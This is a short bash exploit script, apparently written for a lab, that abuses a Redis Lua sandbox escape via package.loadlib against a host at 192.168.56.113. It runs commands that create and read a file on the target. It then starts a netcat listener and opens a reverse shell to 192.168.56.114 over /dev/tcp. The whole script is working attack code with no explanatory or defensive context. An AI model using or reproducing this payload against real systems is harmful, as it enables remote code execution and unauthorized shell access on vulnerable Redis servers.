#!/bin/bash

# Creates a file on the target
redis-cli -h 192.168.56.113 EVAL 'local f = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_os"); local os = f(); return os.execute("id > /var/lib/redis/hacked.txt");' 0

# Reads that created file
redis-cli -h 192.168.56.113 EVAL 'local f = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = f(); local handle = io.popen("cat /var/lib/redis/hacked.txt"); local result = handle:read("*a"); handle:close(); return result' 0

# To start listening for a reverse shell
nc -nvlp 4444

# To open that reverse shell
redis-cli -h 192.168.56.113 EVAL 'local f = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_os"); local os = f(); os.execute("bash -c \"bash -i >& /dev/tcp/192.168.56.114/4444 0>&1\"");' 0